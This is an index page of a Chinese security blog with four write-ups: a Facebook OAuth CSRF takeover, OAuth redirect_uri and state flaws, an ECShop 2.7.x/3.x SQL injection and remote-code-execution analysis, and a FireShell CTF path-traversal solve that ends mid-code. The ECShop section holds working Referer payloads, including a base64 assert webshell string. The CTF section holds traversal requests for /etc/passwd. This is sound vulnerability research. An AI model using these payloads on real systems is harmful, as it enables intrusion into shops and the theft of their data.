<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/"> 
                    对“绕过Facebook Token进行CSRF账号接管”的文章解读 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-02-18   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p>
<p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p>
<p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p>
<p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p>
<h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p>
<h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p>
<p>第二步，即location的Url如下</p>
<pre><code>https://www.facebook.com/comet/dialog_DONOTUSE/?
url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code></pre><p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p>
<h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p>
<p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p>
<p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>

                
            </div>
            <div class="continue">
            <a href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/02/14/Oauth2的两类漏洞挖掘/"> 
                    Oauth2的两类漏洞挖掘 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-02-14   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Oauth2的两类漏洞挖掘"><a href="#Oauth2的两类漏洞挖掘" class="headerlink" title="Oauth2的两类漏洞挖掘"></a>Oauth2的两类漏洞挖掘</h1><p>一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下</p>
<h2 id="redict-uri限制不严格-Oauth配置错误"><a href="#redict-uri限制不严格-Oauth配置错误" class="headerlink" title="redict_uri限制不严格(Oauth配置错误)"></a>redict_uri限制不严格(Oauth配置错误)</h2><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆<br><img src="https://i.loli.net/2019/02/14/5c64d712383f4.png" alt></p>
<p>点击QQ授权的时候请求包和返回包如下<br><img src="https://i.loli.net/2019/02/14/5c64d71326e9b.png" alt></p>
<p>request:</p>
<pre><code>POST /oauth2.0/authorize HTTP/1.1
Host: graph.qq.com
response_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0</code></pre><p>response:</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Wed, 13 Feb 2019 15:17:13 GMT
Content-Type: text/html
Content-Length: 0
Connection: close
Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062</code></pre><p>流程：请求graph.qq.com获得授权，拿到auth code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。</p>
<p>漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下<br><img src="https://i.loli.net/2019/02/14/5c64d712c68d7.png" alt></p>
<h3 id="案例-第三方帐号快捷登录授权劫持漏洞"><a href="#案例-第三方帐号快捷登录授权劫持漏洞" class="headerlink" title="案例-第三方帐号快捷登录授权劫持漏洞"></a>案例-第三方帐号快捷登录授权劫持漏洞</h3><p>修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。</p>
<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>KEY：<a href="https://gh0st.cn/archives/2018-02-12/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-02-12/1</a></p>
<h2 id="无state导致CSRF产生的账户接管"><a href="#无state导致CSRF产生的账户接管" class="headerlink" title="无state导致CSRF产生的账户接管"></a>无state导致CSRF产生的账户接管</h2><p>用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。</p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>拿绑定QQ为例子。</p>
<p>一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF<br><img src="https://i.loli.net/2019/02/14/5c64d712f1b50.png" alt></p>
<h3 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h3><p>OAuth2.0忽略state参数引发的CSRF漏洞：<a href="https://blog.csdn.net/gjb724332682/article/details/54428808" target="_blank" rel="noopener">https://blog.csdn.net/gjb724332682/article/details/54428808</a></p>
<p>Oauth配置错误导致的账户接管：<a href="https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/02/14/Oauth2的两类漏洞挖掘/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/02/02/Echsop2.7.x几处漏洞分析/"> 
                    Echsop2.7.x几处漏洞分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-02-02   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Echsop2-7-x几处漏洞分析"><a href="#Echsop2-7-x几处漏洞分析" class="headerlink" title="Echsop2.7.x几处漏洞分析"></a>Echsop2.7.x几处漏洞分析</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这些洞是在半年前公布的细节，当时没来得及关注。最近在给自己定目标，决定重新刷一遍这些洞。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>由于未对Reffer内容进行过滤而造成的SQL注入</p>
<p>漏洞位置user.php:302</p>
<pre><code>elseif ($action == &#39;login&#39;)
{
    if (empty($back_act))
    {
        if (empty($back_act) &amp;&amp; isset($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]))
        {
            $back_act = strpos($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;], &#39;user.php&#39;) ? &#39;./index.php&#39; : $GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;];
        }
        else
        {
            $back_act = &#39;user.php&#39;;
        }

    }

    $smarty-&gt;assign(&#39;back_act&#39;, $back_act);
    $smarty-&gt;display(&#39;user_passport.dwt&#39;);
}</code></pre><p>$back_act可控为Reffer值，跟进assign</p>
<pre><code>/**
 * 注册变量
 *
 * @access  public
 * @param   mix      $tpl_var
 * @param   mix      $value
 *
 * @return  void
 */
function assign($tpl_var, $value = &#39;&#39;)
{
    if (is_array($tpl_var))
    {
        foreach ($tpl_var AS $key =&gt; $val)
        {
            if ($key != &#39;&#39;)
            {
                $this-&gt;_var[$key] = $val;
            }
        }
    }
    else
    {
        if ($tpl_var != &#39;&#39;)
        {
            $this-&gt;_var[$tpl_var] = $value;
        }
    }
}</code></pre><p>assign()注册了模板变量$this-&gt;_var[‘back_act’]，这里注册的变量在后面的页面模板编译中会用到</p>
<p>继续跟进user的display函数</p>
<pre><code>/**
 * 显示页面函数
 *
 * @access  public
 * @param   string      $filename
 * @param   sting      $cache_id
 *
 * @return  void
 */
function display($filename, $cache_id = &#39;&#39;)
{
    error_reporting(E_ALL ^ E_NOTICE);

    $out = $this-&gt;fetch($filename, $cache_id);

    if (strpos($out, $this-&gt;_echash) !== false)
    {
        $k = explode($this-&gt;_echash, $out);
        foreach ($k AS $key =&gt; $val)
        {
            if (($key % 2) == 1)
            {
                $k[$key] = $this-&gt;insert_mod($val);
            }
        }
        $out = implode(&#39;&#39;, $k);
    }

    echo $out;
}</code></pre><p>Display中调用fetch函数处理模板文件：user_passport.dwt，跟进关键代码</p>
<pre><code>/**
 * 处理模板文件
 *
 * @access  public
 * @param   string      $filename
 * @param   sting      $cache_id
 *
 * @return  sring
 */
function fetch($filename, $cache_id = &#39;&#39;)
{
    ...
    $out = $this-&gt;make_compiled($filename);
    ...
    return $out; // 返回html数据
}</code></pre><p>$filename就是user_passport.dwt，关键内容如下</p>
<pre><code>&lt;tr&gt;
&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;act_login&quot; /&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;back_act&quot; value=&quot;{$back_act}&quot; /&gt;
  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;{$lang.confirm_login}&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;</code></pre><p>通过make_compiled函数编译模板文件，编译时会把之前注册的模板变量渲染到{$back_act}。$out即为渲染后的html代码块</p>
<p>继续跟进流程，回到display。$out内容被分割为两部分，分割依据是$this-&gt;_echash，而$this-&gt;_echash参数值固定<br><img src="https://i.loli.net/2019/02/01/5c546878d638b.png" alt></p>
<pre><code>$k = explode($this-&gt;_echash, $out);
foreach ($k AS $key =&gt; $val)
{
    if (($key % 2) == 1)
    {
        $k[$key] = $this-&gt;insert_mod($val);
    }
}</code></pre><p>跟进insert_mod</p>
<pre><code>function insert_mod($name) // 处理动态内容
{
    list($fun, $para) = explode(&#39;|&#39;, $name);
    $para = unserialize($para);
    $fun = &#39;insert_&#39; . $fun;

    return $fun($para);
}</code></pre><p>继续对$out内容以“|”形式分割成$fun、$para，|后的内容进行反序列化，再动态调用$fun函数。至此，函数名$fun可控，函数内容$para可控，找一个以Insert_开头的可利用的函数</p>
<pre><code>function insert_ads($arr)
{
    static $static_res = NULL;

    $time = gmtime();
    if (!empty($arr[&#39;num&#39;]) &amp;&amp; $arr[&#39;num&#39;] != 1)
    {
        $sql  = &#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39; .
                    &#39;p.ad_height, p.position_style, RAND() AS rnd &#39; .
                &#39;FROM &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad&#39;) . &#39; AS a &#39;.
                &#39;LEFT JOIN &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad_position&#39;) . &#39; AS p ON a.position_id = p.position_id &#39; .
                &quot;WHERE enabled = 1 AND start_time &lt;= &#39;&quot; . $time . &quot;&#39; AND end_time &gt;= &#39;&quot; . $time . &quot;&#39; &quot;.
                    &quot;AND a.position_id = &#39;&quot; . $arr[&#39;id&#39;] . &quot;&#39; &quot; .
                &#39;ORDER BY rnd LIMIT &#39; . $arr[&#39;num&#39;];
        $res = $GLOBALS[&#39;db&#39;]-&gt;GetAll($sql);
    }</code></pre><p>触发SQL注入，构造的PAYLOAD形式：</p>
<pre><code>echash+ads|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</code></pre><p>创宇提供的一个payload示例如下：</p>
<pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre><p>采用limit注入，利用procedure analyse函数。具体见P师傅文章：<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
<h1 id="RCE分析"><a href="#RCE分析" class="headerlink" title="RCE分析"></a>RCE分析</h1><p>RCE利用点还是insert_ads函数，参数的处理流程很大一部分是上文SQL注入的流程，这里分析3.x版本的RCE</p>
<p>继续跟进ads函数，重点部分代码如下：</p>
<pre><code>function insert_ads($arr)
{
    foreach ($res AS $row)
    {
        if ($row[&#39;position_id&#39;] != $arr[&#39;id&#39;])
        {
            continue;
        }
        $position_style = $row[&#39;position_style&#39;];
        ...
    }

    $position_style = &#39;str:&#39; . $position_style;
    $GLOBALS[&#39;smarty&#39;]-&gt;assign(&#39;ads&#39;, $ads);
    $val = $GLOBALS[&#39;smarty&#39;]-&gt;fetch($position_style);
}</code></pre><p>$res为查询结果，即$row[‘position_id’]可用SQL注入的Union select控制，$arr[‘id’]也可控，当两者相等时$position_style的值就可控为$row[‘position_style’]。接着又调用assgin注册变量、fetch编译模板。再看fetch函数</p>
<pre><code>/**
     * 处理模板文件
     *
     * @access  public
     * @param   string      $filename
     * @param   sting      $cache_id
     *
     * @return  sring
     */
function fetch($filename, $cache_id = &#39;&#39;)
{
    if (strncmp($filename,&#39;str:&#39;, 4) == 0)
    {
        $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));
    }
    else
    {
         ......</code></pre><p>由于字符串前被拼接了str:，所以进入$this-&gt;_eval函数处理，这也是最终的漏洞触发点，可以eval我们构造的恶意语句。<br><img src="https://i.loli.net/2019/02/01/5c5468790d352.png" alt></p>
<p>但是再_eval之前经过fetch_str处理字符串，跟进</p>
<pre><code>    /**
     * 处理字符串函数
     *
     * @access  public
     * @param   string     $source
     *
     * @return  sring
     */
    function fetch_str($source)
    {
        if (!defined(&#39;ECS_ADMIN&#39;))
        {
            $source = $this-&gt;smarty_prefilter_preCompile($source);
        }
        $source=preg_replace(&quot;/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;, &quot;&quot;, $source);
        if(preg_match_all(&#39;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&#39;]?php[\&quot;\&#39;]?)~is&#39;, $source, $sp_match))
        {
            $sp_match[1] = array_unique($sp_match[1]);
            for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)
            {
                $source = str_replace($sp_match[1][$curr_sp],&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;,$source);
            }
             for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)
            {
                 $source= str_replace(&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;, &#39;&lt;?php echo \&#39;&#39;.str_replace(&quot;&#39;&quot;, &quot;\&#39;&quot;, $sp_match[1][$curr_sp]).&#39;\&#39;; ?&gt;&#39;.&quot;\n&quot;, $source);
            }
         }
         return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);
    }</code></pre><p>第一个正则会匹配危险的字符串函数，重点在最后一个正则。\\1是替代表达，匹配到的字符串会替代\\1的位置。</p>
<p>eg:<code>return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, &quot;xxx{abc}xxx&quot;);</code>结果就是<code>return $this-&gt;select(&#39;{abc}&#39;)</code></p>
<p>跟进select函数</p>
<pre><code>/**
 * 处理{}标签
 *
 * @access  public
 * @param   string      $tag
 *
 * @return  sring
 */
function select($tag)
{
    $tag = stripslashes(trim($tag));

    if (empty($tag))
    {
        return &#39;{}&#39;;
    }
    elseif ($tag{0} == &#39;*&#39; &amp;&amp; substr($tag, -1) == &#39;*&#39;) // 注释部分
    {
        return &#39;&#39;;
    }
    elseif ($tag{0} == &#39;$&#39;) // 变量
    {
//            if(strpos($tag,&quot;&#39;&quot;) || strpos($tag,&quot;]&quot;))
//            {
//                 return &#39;&#39;;
//            }
        return &#39;&lt;?php echo &#39; . $this-&gt;get_val(substr($tag, 1)) . &#39;; ?&gt;&#39;;
    }
    ......</code></pre><p>trim处理了字符串两边的{}，最后返回一段php标签下的字符串，如果成功返回，则之前的eval就可以执行这段php字符串。不过这个值的获取取决于get_val，跟进get_val</p>
<pre><code>/**
 * 处理smarty标签中的变量标签
 *
 * @access  public
 * @param   string     $val
 *
 * @return  bool
 */
function get_val($val)
{
    if (strrpos($val, &#39;[&#39;) !== false)
    {
        $val = preg_replace(&quot;/\[([^\[\]]*)\]/eis&quot;, &quot;&#39;.&#39;.str_replace(&#39;$&#39;,&#39;\$&#39;,&#39;\\1&#39;)&quot;, $val);
    }

    if (strrpos($val, &#39;|&#39;) !== false)
    {
        $moddb = explode(&#39;|&#39;, $val);
        $val = array_shift($moddb);
    }

    if (empty($val))
    {
        return &#39;&#39;;
    }

    if (strpos($val, &#39;.$&#39;) !== false)
    {
        $all = explode(&#39;.$&#39;, $val);

        foreach ($all AS $key =&gt; $val)
        {
            $all[$key] = $key == 0 ? $this-&gt;make_var($val) : &#39;[&#39;. $this-&gt;make_var($val) . &#39;]&#39;;
        }
        $p = implode(&#39;&#39;, $all);
    }
    else
    {
        $p = $this-&gt;make_var($val);
    }</code></pre><p>若$val不存在<code>.$</code>则进入make_var()</p>
<pre><code>/**
 * 处理去掉$的字符串
 *
 * @access  public
 * @param   string     $val
 *
 * @return  bool
 */
function make_var($val)
{
    if (strrpos($val, &#39;.&#39;) === false)
    {
        if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val]))
        {
            $val = $this-&gt;_patchstack[$val];
        }
        $p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;
    }
    else
    {
       .....</code></pre><p>这个make_var的$val可控，则表明返回的$p可控，最终返回的$this-&gt;get_val()就可控，也就是$this-&gt;_eval的实参可控（一段PHP标签下的字符串），从而getshell。</p>
<p>构造Payload我用逆推的思路，逐步满足每个函数判断的条件<br><img src="https://i.loli.net/2019/02/02/5c54fa8f5fb8b.png" alt></p>
<p>最终的POC要结合SQL注入，通过id和num参数将order by注释<br><img src="https://i.loli.net/2019/02/02/5c54fa8f75fb6.png" alt></p>
<p>再利用union select构造指定列的值：第二列postion_id，第七列position_style<br><img src="https://images.seebug.org/content/images/2018/09/cd7f6796-c175-46c0-a7c4-9cdb480ab960.png-w331s" alt></p>
<pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></pre><p>id的值就是<code>&#39; /*</code>，num的值<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，0x27202f2a是<code>&#39; /*</code>的16进制值，也就是第二列<code>$row[&#39;position_id&#39;]</code>的值<code>。0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>为<code>{$&#39;];phpinfo/**/();//}</code>的16进制值</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>看到ecshop4/ecshop/includes/lib_insert.php<br><img src="https://images.seebug.org/content/images/2018/09/d542c73a-d3ef-4e89-8394-aa85c7f1332e.png-w331s" alt></p>
<p>对id和num进行强制类型转换了，字符串无法利用</p>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>创宇WAF拦截的Payload是这样</p>
<pre><code>{$abc&#39;];assert(base64_decode(&#39;YXNzZXJ0KCRfR0VUWyd4J10pOw==&#39;));//}</code></pre><p>巧妙解决了$_GET[]的[]问题，测试用法</p>
<p><img src="https://i.loli.net/2019/02/02/5c55aa16d0c98.png" alt></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://paper.seebug.org/695/#_5" target="_blank" rel="noopener">https://paper.seebug.org/695/#_5</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/"> 
                    FireShellCTF2019 Bad Injections解题记录 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-30   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p>
<p>题目名称：Bad Injections</p>
<p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p>
<p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p>
<p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p>
<p>给个本地web目录</p>
<p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p>
<p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p>
<pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
<p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p>
<p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p>
<p>down一下download的源码，顺便fuzz一下Controllers的文件</p>
<pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
<p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p>
<p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p>
<pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p>
<pre><code>&lt;?php
ini_set(&#39;display_errors&#39;,1);
ini_set(&#39;display_startup_erros&#39;,1);
error_reporting(E_ALL);
require_once(&#39;Routes.php&#39;);

function __autoload($class_name){
  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){
    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;
  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){
    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;
  }

}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
<pre><code>&lt;?php

Route::set(&#39;index.php&#39;,function(){
  Index::createView(&#39;Index&#39;);
});

Route::set(&#39;index&#39;,function(){
  Index::createView(&#39;Index&#39;);
});

Route::set(&#39;about-us&#39;,function(){
  AboutUs::createView(&#39;AboutUs&#39;);
});

Route::set(&#39;contact-us&#39;,function(){
  ContactUs::createView(&#39;ContactUs&#39;);
});

Route::set(&#39;list&#39;,function(){
  ContactUs::createView(&#39;Lista&#39;);
});

Route::set(&#39;verify&#39;,function(){   
  if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){
    Verify::createView(&#39;Verify&#39;);
  }else{
    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件
  }
});


Route::set(&#39;download&#39;,function(){
  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){
    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
  }else{
    echo &#39;jdas&#39;;
  }
});

Route::set(&#39;verify/download&#39;,function(){
  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
});


Route::set(&#39;custom&#39;,function(){
  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
  $data = stream_get_contents($handler); // xml
